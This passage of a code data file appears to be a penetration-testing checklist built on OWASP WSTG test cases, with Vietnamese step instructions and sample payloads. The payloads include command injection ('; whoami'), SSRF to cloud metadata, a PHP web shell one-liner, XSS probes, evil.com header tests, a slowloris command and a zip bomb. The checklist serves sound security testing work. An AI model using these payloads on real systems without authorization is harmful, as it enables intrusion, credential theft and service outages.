        strategy: 'Black-box',
        severity: 'Critical'
      },
      {
        id: 'WSTG-INPV-12',
        category: 'Input Validation',
        title: 'Testing for Command Injection',
        description: 'Chèn lệnh hệ điều hành (OS Command).',
        objectives: ['RCE.'],
        instructions: 'Bước 1: Tìm input gọi lệnh shell (ping, resize).\nBước 2: Nối lệnh (; | &&).\nBước 3: Inject whoami/id.',
        payloads: [
          { code: '; whoami', description: 'Linux Command.' },
          { code: '&& type C:\\boot.ini', description: 'Windows Command.' }
        ],
        strategy: 'Black-box',
        severity: 'Critical'
      },
      {
        id: 'WSTG-INPV-13',
        category: 'Input Validation',
        title: 'Testing for Format String Injection',
        description: 'Gửi chuỗi định dạng (%x, %n) gây lỗi hoặc đọc bộ nhớ (thường gặp ở C/C++).',
        objectives: ['DoS, Read Memory, Code Exec.'],
        instructions: 'Bước 1: Gửi %x%x%x.\nBước 2: Xem response có in ra dữ liệu hex không.',
        payloads: [
          { code: '%x%x%x%x', description: 'Format String Read.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-INPV-14',
        category: 'Input Validation',
        title: 'Testing for Incubated Vulnerability',
        description: 'Lỗ hổng ủ bệnh (Stored XSS/SQLi) chỉ kích hoạt khi admin xem hoặc sau 1 thời gian.',
        objectives: ['Khai thác người dùng đặc quyền.'],
        instructions: 'Bước 1: Lưu payload vào profile/log.\nBước 2: Chờ admin view hoặc cron job chạy.',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-15',
        category: 'Input Validation',
        title: 'Testing for HTTP Splitting/Smuggling',
        description: 'Desync giữa proxy và backend server.',
        objectives: ['Bypass Security Control, Cache Poisoning.'],
        instructions: 'Bước 1: Gửi request với CL.TE hoặc TE.CL header.\nBước 2: Quan sát phản hồi.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-16',
        category: 'Input Validation',
        title: 'Testing for HTTP Incoming Requests',
        description: 'Kiểm tra cách server xử lý các header đặc biệt (X-Forwarded-For, Host).',
        objectives: ['Spoof IP, Bypass Access Control.'],
        instructions: 'Bước 1: Thêm X-Forwarded-For: 127.0.0.1.\nBước 2: Check xem có bypass được IP restriction không.',
        payloads: [
          { code: 'X-Forwarded-For: 127.0.0.1', description: 'IP Spoofing.' }
        ],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-INPV-17',
        category: 'Input Validation',
        title: 'Testing for Host Header Injection',
        description: 'Thay đổi Host Header để gây độc cache hoặc reset password link.',
        objectives: ['Cache Poisoning, Reset Password Hijacking.'],
        instructions: 'Bước 1: Intercept request.\nBước 2: Đổi Host header thành attacker.com.\nBước 3: Xem response có phản chiếu host không.',
        payloads: [
          { code: 'Host: evil.com', description: 'Basic Host Injection.' },
          { code: 'X-Forwarded-Host: evil.com', description: 'Via Headers.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-INPV-18',
        category: 'Input Validation',
        title: 'Testing for Server Side Request Forgery (SSRF)',
        description: 'Ép server gửi request tới mạng nội bộ hoặc external.',
        objectives: ['Scan port nội bộ, đọc metadata cloud.'],
        instructions: 'Bước 1: Tìm tham số URL (webhook, fetch).\nBước 2: Nhập IP loopback/internal.\nBước 3: Check response.',
        payloads: [
          { code: 'http://127.0.0.1:80', description: 'Localhost scan.' },
          { code: 'http://169.254.169.254/latest/meta-data/', description: 'AWS Metadata.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-INPV-19',
        category: 'Input Validation',
        title: 'Testing for Server Side Template Injection (SSTI)',
        description: 'Inject mã template engine để thực thi code.',
        objectives: ['RCE trên server.'],
        instructions: 'Bước 1: Tìm input in ra màn hình.\nBước 2: Inject toán học {{7*7}}.\nBước 3: Nếu hiện 49 -> Lỗi SSTI.',
        payloads: [
          { code: '{{7*7}}', description: 'Generic Test.' },
          { code: '${7*7}', description: 'Java/Smarty Test.' },
          { code: '<%= 7*7 %>', description: 'ERB/EJS Test.' }
        ],
        strategy: 'Black-box',
        severity: 'Critical'
      }
    ]
  },
  {
    id: 'ERRH',
    name: '4.8. Error Handling (Xử lý lỗi)',
    tests: [
      {
        id: 'WSTG-ERRH-01',
        category: 'Error Handling',
        title: 'Testing for Improper Error Handling',
        description: 'Lộ thông tin qua thông báo lỗi.',
        objectives: ['Tìm stack trace, path, db version.'],
        instructions: 'Bước 1: Gây lỗi (nhập sai type, ký tự lạ).\nBước 2: Đọc response tìm info.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-ERRH-02',
        category: 'Error Handling',
        title: 'Testing for Stack Traces',
        description: 'Kiểm tra xem ứng dụng có in Stack Trace ra màn hình không.',
        objectives: ['Tìm thông tin debug.'],
        instructions: 'Bước 1: Gây ra Exception (ví dụ null pointer).\nBước 2: Kiểm tra nội dung response.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      }
    ]
  },
  {
    id: 'CRYP',
    name: '4.9. Cryptography (Mã hóa)',
    tests: [
      {
        id: 'WSTG-CRYP-01',
        category: 'Cryptography',
        title: 'Testing for Weak SSL/TLS Ciphers',
        description: 'Check SSL/TLS version/cipher yếu.',
        objectives: ['Man-in-the-Middle.'],
        instructions: 'Bước 1: Dùng testssl.sh hoặc nmap ssl-enum.',
        payloads: [
          { code: 'testssl.sh target.com', description: 'SSL Scan.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-CRYP-02',
        category: 'Cryptography',
        title: 'Testing for Padding Oracle',
        description: 'Kiểm tra xem ứng dụng có tiết lộ lỗi padding khi giải mã không.',
        objectives: ['Giải mã dữ liệu mã hóa.'],
        instructions: 'Bước 1: Thay đổi byte cuối của chuỗi mã hóa.\nBước 2: Quan sát thông báo lỗi padding.',
        payloads: [
          { code: 'PadBuster', description: 'Tool tấn công Padding Oracle.' }
        ],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CRYP-03',
        category: 'Cryptography',
        title: 'Testing for Sensitive Information Sent via Unencrypted Channels',
        description: 'Dữ liệu nhạy cảm đi qua HTTP.',
        objectives: ['Sniff dữ liệu.'],
        instructions: 'Bước 1: Wireshark/Burp.\nBước 2: Tìm pass/token trong HTTP.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CRYP-04',
        category: 'Cryptography',
        title: 'Testing for Weak Randomness',
        description: 'Kiểm tra việc sử dụng PRNG yếu trong token/password reset.',
        objectives: ['Dự đoán token.'],
        instructions: 'Bước 1: Thu thập nhiều mẫu token.\nBước 2: Phân tích tính ngẫu nhiên (Entropy).',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'Medium'
      }
    ]
  },
  {
    id: 'BUSL',
    name: '4.10. Business Logic (Logic nghiệp vụ)',
    tests: [
      {
        id: 'WSTG-BUSL-01',
        category: 'Business Logic',
        title: 'Test Business Logic Data Validation',
        description: 'Validate logic (số âm, giá tiền).',
        objectives: ['Mua hàng giá âm, bypass limit.'],
        instructions: 'Bước 1: Chặn request mua hàng.\nBước 2: Sửa price/quantity thành số âm.\nBước 3: Check logic.',
        payloads: [
          { code: 'quantity: -1', description: 'Negative quantity.' },
          { code: 'price: 0.01', description: 'Low price.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-BUSL-02',
        category: 'Business Logic',
        title: 'Test Ability to Forge Requests',
        description: 'Giả mạo request bỏ qua bước logic (Skip payment).',
        objectives: ['Mua hàng không trả tiền.'],
        instructions: 'Bước 1: Mua hàng, đến bước thanh toán.\nBước 2: Force browse tới trang "Success".',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-BUSL-03',
        category: 'Business Logic',
        title: 'Test Integrity Checks',
        description: 'Thay đổi tham số ẩn (ID, hash) để phá vỡ tính toàn vẹn.',
        objectives: ['Thay đổi dữ liệu không được phép.'],
        instructions: 'Bước 1: Đổi ID trong POST request.\nBước 2: Kiểm tra xem server có validate quyền sở hữu không.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-BUSL-04',
        category: 'Business Logic',
        title: 'Test Process Timing',
        description: 'Kiểm tra lỗi logic liên quan đến thời gian (Timing attacks, Race conditions).',
        objectives: ['Lợi dụng khoảng thời gian xử lý để khai thác.'],
        instructions: 'Bước 1: Gửi nhiều request đồng thời để tranh chấp tài nguyên (Race Condition).',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-BUSL-05',
        category: 'Business Logic',
        title: 'Test Number of Times a Function Can Be Used',
        description: 'Spam chức năng, Race Condition (dùng mã giảm giá nhiều lần).',
        objectives: ['Dùng coupon 2 lần.'],
        instructions: 'Bước 1: Dùng Burp Turbo Intruder.\nBước 2: Gửi song song request dùng coupon.',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-BUSL-06',
        category: 'Business Logic',
        title: 'Test Circumvention of Workflows',
        description: 'Kiểm tra khả năng bỏ qua quy trình nghiệp vụ (nhảy bước).',
        objectives: ['Hoàn thành quy trình mà không qua các bước bắt buộc.'],
        instructions: 'Bước 1: Xác định các bước 1->2->3.\nBước 2: Thử truy cập bước 3 trực tiếp mà không qua bước 2.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-BUSL-07',
        category: 'Business Logic',
        title: 'Test Defenses Against Application Misuse',
        description: 'Kiểm tra cơ chế phòng vệ chống lạm dụng (Rate limiting, Captcha).',
        objectives: ['Spam, Brute-force không bị chặn.'],
        instructions: 'Bước 1: Gửi liên tục request.\nBước 2: Kiểm tra xem có bị block hay CAPTCHA không.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-BUSL-08',
        category: 'Business Logic',
        title: 'Test Upload of Unexpected File Types',
        description: 'Upload file không mong muốn (exe, sh) mà server không chặn.',
        objectives: ['Upload file độc hại.'],
        instructions: 'Bước 1: Đổi extension file.\nBước 2: Đổi Content-Type.\nBước 3: Upload.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-BUSL-09',
        category: 'Business Logic',
        title: 'Test Upload of Malicious Files',
        description: 'Upload file chứa mã độc (Web shell) và thực thi.',
        objectives: ['RCE.'],
        instructions: 'Bước 1: Upload shell.php.\nBước 2: Truy cập file.',
        payloads: [
          { code: '<?php system($_GET["c"]); ?>', description: 'Simple Web Shell.' }
        ],
        strategy: 'Black-box',
        severity: 'Critical'
      }
    ]
  },
  {
    id: 'CLNT',
    name: '4.11. Client-side Testing',
    tests: [
      {
        id: 'WSTG-CLNT-01',
        category: 'Client-side',
        title: 'Testing for DOM-based XSS',
        description: 'XSS qua DOM Sink/Source.',
        objectives: ['Exec JS.'],
        instructions: 'Bước 1: Tìm source (location.hash).\nBước 2: Tìm sink (innerHTML).\nBước 3: Inject.',
        payloads: [
          { code: '#<img src=x onerror=alert(1)>', description: 'Hash DOM XSS.' }
        ],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CLNT-02',
        category: 'Client-side',
        title: 'Testing for JavaScript Execution',
        description: 'Kiểm tra việc thực thi JS không an toàn.',
        objectives: ['XSS.'],
        instructions: 'Bước 1: Tìm hàm eval(), setTimeout() trong JS code.',
        payloads: [],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CLNT-03',
        category: 'Client-side',
        title: 'Testing for HTML Injection',
        description: 'Chèn thẻ HTML để thay đổi giao diện (Defacement).',
        objectives: ['Phishing, Defacement.'],
        instructions: 'Bước 1: Inject <h1>Hacked</h1>.\nBước 2: Xem có hiển thị không.',
        payloads: [
            { code: '<h1>Hacked</h1>', description: 'HTML Injection.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-CLNT-04',
        category: 'Client-side',
        title: 'Testing for Client-side URL Redirect',
        description: 'Redirect không an toàn qua JS.',
        objectives: ['Phishing redirect.'],
        instructions: 'Bước 1: Tìm tham số URL đích.\nBước 2: Đổi thành evil.com.',
        payloads: [
          { code: 'target.com?redirect=http://evil.com', description: 'Open Redirect.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-CLNT-05',
        category: 'Client-side',
        title: 'Testing for CSS Injection',
        description: 'Chèn CSS để trích xuất dữ liệu hoặc thay đổi giao diện.',
        objectives: ['Exfiltrate data (CSRF token).'],
        instructions: 'Bước 1: Inject style tag.\nBước 2: Dùng background-image để exfiltrate.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CLNT-06',
        category: 'Client-side',
        title: 'Testing for Client-side Resource Manipulation',
        description: 'Kiểm tra việc thao tác tài nguyên phía client (sửa URL ảnh, script).',
        objectives: ['Thay đổi nội dung hiển thị.'],
        instructions: 'Bước 1: Can thiệp request tải resource.\nBước 2: Thay đổi URL resource.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CLNT-07',
        category: 'Client-side',
        title: 'Testing for Cross Origin Resource Sharing (CORS)',
        description: 'Cấu hình CORS lỏng lẻo (Access-Control-Allow-Origin: *).',
        objectives: ['Đọc dữ liệu từ domain khác.'],
        instructions: 'Bước 1: Gửi request với Origin: evil.com.\nBước 2: Check xem server có phản hồi ACAO: evil.com và ACAC: true không.',
        payloads: [
          { code: 'Origin: https://evil.com', description: 'Test Arbitrary Origin.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CLNT-08',
        category: 'Client-side',
        title: 'Testing for Cross Site Flashing',
        description: 'Kiểm tra file Flash (.swf) cho phép truy cập domain chéo (Legacy).',
        objectives: ['Thực thi script qua Flash.'],
        instructions: 'Bước 1: Tìm file .swf.\nBước 2: Decompile và kiểm tra allowDomain.',
        payloads: [],
        strategy: 'White-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CLNT-09',
        category: 'Client-side',
        title: 'Testing for Clickjacking',
        description: 'Nhúng site vào iframe.',
        objectives: ['Lừa click.'],
        instructions: 'Bước 1: Tạo file HTML chứa iframe.\nBước 2: Load site target.',
        payloads: [
          { code: '<iframe src="target.com">', description: 'Clickjacking PoC.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-CLNT-10',
        category: 'Client-side',
        title: 'Testing Web Messaging (postMessage)',
        description: 'Kiểm tra lỗ hổng trong postMessage listener.',
        objectives: ['XSS qua postMessage.'],
        instructions: 'Bước 1: Tìm window.addEventListener("message", ...).\nBước 2: Gửi message độc hại từ trang khác.',
        payloads: [
          { code: 'window.postMessage("<img src=x onerror=alert(1)>", "*")', description: 'PostMessage XSS.' }
        ],
        strategy: 'Gray-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CLNT-11',
        category: 'Client-side',
        title: 'Testing WebSockets',
        description: 'Kiểm tra lỗ hổng trong WebSockets (CSWSH).',
        objectives: ['Hijack WebSocket.'],
        instructions: 'Bước 1: Bắt request WebSocket handshake.\nBước 2: Thay đổi header Origin.',
        payloads: [
          { code: 'Origin: https://evil.com', description: 'Cross-Site WebSocket Hijacking.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-CLNT-12',
        category: 'Client-side',
        title: 'Testing Web Storage',
        description: 'Kiểm tra dữ liệu nhạy cảm trong LocalStorage/SessionStorage.',
        objectives: ['Tìm token, PII.'],
        instructions: 'Bước 1: F12 -> Application -> Storage.\nBước 2: Review key/value.',
        payloads: [],
        strategy: 'Black-box',
        severity: 'Low'
      },
      {
        id: 'WSTG-CLNT-13',
        category: 'Client-side',
        title: 'Testing for Cross Site Script Inclusion (XSSI)',
        description: 'Kiểm tra rò rỉ dữ liệu nhạy cảm thông qua việc nhúng script/JSON từ domain khác.',
        objectives: ['Đọc trộm dữ liệu JSON/Variable nhạy cảm.'],
        instructions: 'Bước 1: Tìm endpoint trả về JSON dynamic hoặc JS chứa data.\nBước 2: Nhúng vào trang attacker bằng thẻ <script src="...">.\nBước 3: Kiểm tra xem biến global hoặc prototype có bị rò rỉ không.',
        payloads: [
          { code: '<script src="https://target.com/api/user_data.json"></script>', description: 'Basic XSSI Include.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      }
    ]
  },
  {
    id: 'API',
    name: '4.12. API Testing',
    tests: [
      {
        id: 'WSTG-API-01',
        category: 'API Testing',
        title: 'Testing GraphQL',
        description: 'Introspection, DoS, Injection trên GraphQL.',
        objectives: ['Dump Schema.'],
        instructions: 'Bước 1: Tìm endpoint /graphql.\nBước 2: Gửi Introspection Query.',
        payloads: [
          { code: '{__schema{types{name}}}', description: 'Introspection.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      },
      {
        id: 'WSTG-API-02',
        category: 'API Testing',
        title: 'Testing REST API',
        description: 'Mass Assignment, Broken Auth, Throttling.',
        objectives: ['Manipulate object.'],
        instructions: 'Bước 1: Check method PUT/PATCH.\nBước 2: Thêm field (isAdmin: true).',
        payloads: [
          { code: '{"isAdmin": true}', description: 'Mass Assignment.' }
        ],
        strategy: 'Black-box',
        severity: 'High'
      }
    ]
  },
  {
    id: 'DOS',
    name: '4.13. Denial of Service (Từ chối dịch vụ)',
    tests: [
      {
        id: 'WSTG-DOS-01',
        category: 'Denial of Service',
        title: 'Testing for HTTP Protocol DoS',
        description: 'Kiểm tra khả năng chịu tải trước các cuộc tấn công tầng ứng dụng (Slowloris, HTTP Flood).',
        objectives: ['Làm tê liệt server với resource thấp.'],
        instructions: 'Bước 1: Dùng công cụ Slowloris gửi request chậm.\nBước 2: Quan sát thời gian phản hồi của server.',
        payloads: [
          { code: 'slowloris.pl -dns target.com', description: 'Slowloris Attack.' }
        ],
        strategy: 'Black-box',
        severity: 'Medium'
      },
      {
        id: 'WSTG-DOS-03',
        category: 'Denial of Service',
        title: 'Testing for Application Level DoS',
        description: 'Tấn công vào các chức năng tốn tài nguyên (Zip bomb, Search wildcard, User Lockout).',
        objectives: ['Chiếm dụng CPU/RAM, khóa tài khoản hàng loạt.'],
        instructions: 'Bước 1: Tìm chức năng xử lý nặng (Upload zip, Search).\nBước 2: Gửi payload kích thước lớn hoặc wildcard *.',
        payloads: [
          { code: 'Upload 10GB zip bomb', description: 'Zip Bomb.' },
          { code: 'Search: %%%...%', description: 'Database DoS.' }
        ],
        strategy: 'Gray-box',
        severity: 'High'
      }
    ]
  }
];